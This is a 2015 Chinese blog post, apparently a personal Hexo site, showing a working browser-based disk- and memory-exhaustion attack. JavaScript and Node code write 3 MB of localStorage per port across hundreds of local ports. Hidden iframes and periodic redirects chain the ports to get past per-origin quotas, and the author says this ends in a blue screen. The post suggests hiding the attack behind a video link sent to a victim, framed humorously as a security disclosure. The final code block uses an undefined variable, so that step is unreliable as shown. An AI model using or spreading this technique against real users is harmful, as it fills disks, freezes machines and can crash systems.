<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    作为一个前端，可以如何机智地弄坏一台电脑？ |
    
    Hexo</title>
  
    <link rel="shortcut icon" href="/favicon.ico">
  
  <link rel="stylesheet" href="/css/style.css">
  
    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
  
  <script src="/js/pace.min.js"></script>
</head>
</html>
<body>
<main class="content">
  <section class="outer">
  <article id="post-hack-in-localstorage" class="article article-type-post" itemscope="" itemprop="blogPost">

  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      作为一个前端，可以如何机智地弄坏一台电脑？
    </h1>
  

      </header>
    

    
      <div class="article-meta">
        <a href="/2015/07/06/hack-in-localstorage/" class="article-date">
  <time datetime="2015-07-06T14:30:00.000Z" itemprop="datePublished">2015-07-06</time>
</a>
        
      </div>
    

    <div class="article-entry" itemprop="articleBody">
      
      
      
        <p>有人说，前端的界限就在浏览器那儿。</p>
<p>无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。<br>这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。<br>然而，作为一个前端，我发现是有方式打开次元大门的…</p>
<p>这个实验脑洞较大，动机无聊，但某种意义上反映了一些<strong>安全问题</strong>。<br>想象一下，有天你在家里上网，吃着火锅还唱着歌，<strong>点开一个链接，电脑突然就蓝屏了</strong>！想想还真有点小激动。<br><a id="more"></a></p>
<h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>故事得从localStorage说起。</p>
<p>html5的本地存储，相信大家都不陌生。将数据以二进制文件形式存储到本地，在当前应用得非常广泛。<br>windows下的chrome，localStorage存储于<code>C:\Users\xxx\AppData\Local\Google\Chrome\User Data\Default\Local Storage</code>文件夹中。但如果任由网页无限写文件，对用户硬盘的伤害可想而知，因而浏览器对其做了大小限制。</p>
<p>对于一个域名+端口，PC侧的上限是5M-10M之间，移动侧是则不大于2.5M。</p>
<p>那么问题就变成：<strong>这样的限制足够保护用户硬盘了吗</strong>？</p>
<h3 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h3><p>关键的问题在于，这一限制，针对的是一个<code>域名+端口</code>。<br>也就是说，你访问<code>同一个域名的不同端口</code>，它们的localStorage并无关联，是分开存储的。</p>
<p>我用node简单地开启了服务器，这时，用户访问<code>http://127.0.0.1:1000</code>到<code>http://127.0.0.1:1099</code>这100个端口，会请求到同一个页面：<code>index.html</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line">var fs = require(&apos;fs&apos;);</span><br><span class="line"></span><br><span class="line">//100个端口</span><br><span class="line">for(var port = 1000; port&lt; 1100; port++)&#123;</span><br><span class="line">  http.createServer(function (request, response) &#123;</span><br><span class="line">    //请忽略这种循环读文件的方式，只为了简便</span><br><span class="line">    fs.readFile(&apos;./index.html&apos;, function(err, content)&#123;</span><br><span class="line">      if(err) &#123;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        response.writeHead(200, &#123; &apos;Content-Type&apos; : &apos;text/html; charset=UTF-8&apos; &#125;);</span><br><span class="line">        response.write(content);</span><br><span class="line">        response.end();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;).listen(port, &apos;127.0.0.1&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然，这个index.html里涉及了localStorage写操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var s = &quot;&quot;;</span><br><span class="line">//慢慢来，别写太大了，好害怕…</span><br><span class="line">for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</span><br><span class="line">  s += &quot;0&quot;;</span><br><span class="line">&#125;</span><br><span class="line">localStorage.setItem(&quot;testData&quot;, s);</span><br></pre></td></tr></table></figure>
<p>我试着用浏览器分别访问了几个端口，结果是分开存储。一切跟剧本一样。</p>
<h3 id="自动遍历"><a href="#自动遍历" class="headerlink" title="自动遍历"></a>自动遍历</h3><p>但这种程度还不够。<br>如果要实验变得更好（xie）玩（e）一些，问题就变成如何<code>让用户自动遍历这些端口</code>？</p>
<p>iframe是个好的尝试。<br>只要一打开<code>http://127.0.0.1: 1000</code>，页面的脚步就会创建一个iframe，去请求<code>http://127.0.0.1: 1001</code>，一直循环下去。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var Main = (function()&#123;</span><br><span class="line">  var _key = &quot;testData&quot;;</span><br><span class="line">  var _max = 1100; //最大限制</span><br><span class="line">  return &#123;</span><br><span class="line">    init: function()&#123;</span><br><span class="line">      //慢慢来，别写太大了，好害怕…</span><br><span class="line">      var s = &quot;&quot;;</span><br><span class="line">      for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</span><br><span class="line">        s += &quot;0&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      localStorage.setItem(_key, s);</span><br><span class="line"></span><br><span class="line">      var port = parseInt(location.port)+1;</span><br><span class="line">      if(port &gt; _max) return;</span><br><span class="line"></span><br><span class="line">      //新添加iframe</span><br><span class="line">      var url = &quot;http://127.0.0.1:&quot; + port;</span><br><span class="line">      var $iframe = document.createElement(&quot;iframe&quot;);</span><br><span class="line">      $iframe.src = url;</span><br><span class="line">      document.getElementsByTagName(&quot;body&quot;)[0].appendChild($iframe);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p>当然iframe我们还可以设置为不可见，以掩盖这种不厚道的行为…<br>比方说，有人发给你一个链接，你打开后发现是个视频，而你根本注意不到背后的脚本，在视频播放的几分钟里，快要把你的C盘写满。</p>
<p>然后我就看到请求如潮水渐涨：<br><img src="/assets/blogImg/localstorage1.png" alt=""></p>
<p>但是，请求到1081端口，最新的chrome就崩溃掉了…原来iframe嵌套太多，已经到达了浏览器的极限。</p>
<p>###防止浏览器崩溃</p>
<p>C盘还未撑满，同志还需努力。怎么办？</p>
<p>突然想到，到达iframe极限之前，我们可以重定向啊。<br>每访问50个端口，就使用<code>window.location.href</code>重定向一次，去确保浏览器不崩溃。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">var Main = (function()&#123;</span><br><span class="line">  var _key = &quot;testData&quot;;</span><br><span class="line">  var _max = 1200; //最大限制</span><br><span class="line">  var _jumpSpace = 50; //为避免iframe过多导致浏览器crash，每50个执行跳转</span><br><span class="line"></span><br><span class="line">  return &#123;</span><br><span class="line">    init: function()&#123;</span><br><span class="line">      //慢慢来，别写太大了，好害怕…</span><br><span class="line">      var s = &quot;&quot;;</span><br><span class="line">      for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</span><br><span class="line">        s += &quot;0&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      localStorage.setItem(_key, s);</span><br><span class="line"></span><br><span class="line">      var port = parseInt(location.port)+1;</span><br><span class="line">      if(port &gt; _max) return;</span><br><span class="line"></span><br><span class="line">      if(port % _jumpSpace == 0)&#123;</span><br><span class="line">        //每50个，重定向一次</span><br><span class="line">        window.location.href = url;</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">        //新添加iframe</span><br><span class="line">        var $iframe = document.createElement(&quot;iframe&quot;);</span><br><span class="line">        $iframe.src = url;</span><br><span class="line">        document.getElementsByTagName(&quot;body&quot;)[0].appendChild($iframe);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p>事实证明，这种蛮拼的方法的确可行。</p>
<p>至此，只要访问<code>http://127.0.0.1: 1000</code>，就会往Local Storage文件夹里写入近500M无用数据：<br><img src="/assets/blogImg/localstorage3.png" alt=""></p>
<p>里面的数据是这样的：<br><img src="/assets/blogImg/localstorage2.png" alt=""></p>
<h3 id="继续实验的黑科技"><a href="#继续实验的黑科技" class="headerlink" title="继续实验的黑科技"></a>继续实验的黑科技</h3><p>算了下我的C盘还有空间嘛，那就把端口数量从100增长到200个。<br>结果是这样的，到达了1.17G大小。<br><img src="/assets/blogImg/localstorage4.png" alt=""></p>
<p>在后续的实验中，我就慢慢的把端口数量与存储的数据调大。</p>
<p>电脑也运行得越来越慢。这是为什么呢？</p>
<p>我观察到，有时候执行<code>localStorage.setItem()</code>后，在文件夹里不一定立即能看到数据文件。<br>怀疑这些数据会被chrome先放到内存里，以避免重复读写带来的消耗，在空闲或关闭的时机，再写进硬盘里。</p>
<p>但此时，浏览器已经影响到系统了。它处于一种“不会崩溃”，但“因为占用了许多内存，已经妨碍用户电脑的正常使用”的状态。<br>即使用户关闭了浏览器窗口，也不会很快恢复。要知道读写任务并不是随窗口关闭而终止的，否则浏览器会丢失数据。</p>
<p>遭遇黑科技的人们能做的只有：</p>
<ol>
<li>等待；</li>
<li>用任务管理器关掉chrome进程，再等待；</li>
<li>相信并尝试“重启电脑解决90%电脑问题”的科学论断</li>
</ol>
<p>可以说，浏览器的内心几乎是崩溃的。</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>最后，还是得用严肃脸告诫一下：害人之心不可无。<br>本实验，从一开始就是怀揣着将<code>安全问题上交给国家的初衷</code>去做的（是的就是这么纯粹）。</p>
<p>后续，看着C盘还有2G空间，我又把端口增长到2000个，试下会发生什么。<br>由于请求过多，需要一定时间，我就去做别的事情了。<br>回来后发现房间安静祥和，美轮美奂，一片蓝光，像是加了特技。</p>
<p><img src="/assets/blogImg/localstorage5.png" alt=""></p>
<p>那么问题来了，计算机修理哪家强？<br>有点急…</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2015/07/06/hack-in-localstorage/" data-id="cjpmgqwpn001oex5rdlk42vqe" class="article-share-link">Share</a>
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/js/">js</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全/">安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/黑科技/">黑科技</a></li></ul>

    </footer>

  </div>

  
    
  <nav class="article-nav">
    
      <a href="/2015/11/03/nginx-in-fe/" class="article-nav-link">
        <strong class="article-nav-caption">Newer posts</strong>
        <div class="article-nav-title">
          
            Nginx能为前端开发带来什么？
          
        </div>
      </a>
    
    
      <a href="/2015/06/05/viewing-commentary/" class="article-nav-link">
        <strong class="article-nav-caption">Olde posts</strong>
        <div class="article-nav-title">半年新影短评</div>
      </a>
    
  </nav>


  

  
    
  

</article>



</section>
  <footer class="footer">
  
  <div class="outer">
    <ul class="list-inline">
      <li>&copy; 2018 Hexo</li>
      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
      <li>Theme  <a href="https://zhwangart.github.io">zhwangart</a></li>
      <!--
      <li><a href="/">John Doe</a></li>
      -->
    </ul>
  </div>
</footer>
</main>
<aside class="sidebar">
  <button class="navbar-toggle"></button>

<nav class="navbar">
  
    <div class="logo">
      <a href="/"><img src="/images/hexo.svg" alt="Hexo"></a>
    </div>
  
  <ul class="nav nav-main">
    
      <li class="nav-item">
        <a class="nav-item-link" href="/">Home</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/archives">Archives</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/gallery">Gallery</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/about">About</a>
      </li>
    
    <li class="nav-item">
      <a class="nav-item-link nav-item-search" title="Search">
        <i class="fe fe-search"></i>
        Search
      </a>
    </li>
  </ul>
</nav>

<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
          <i class="fe fe-feed"></i>
        </a>
      
    </li>
  </ul>
</nav>

<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
</aside>
<script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/lazyload.min.js"></script>


  <script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/ocean.js"></script>

</body>
</html>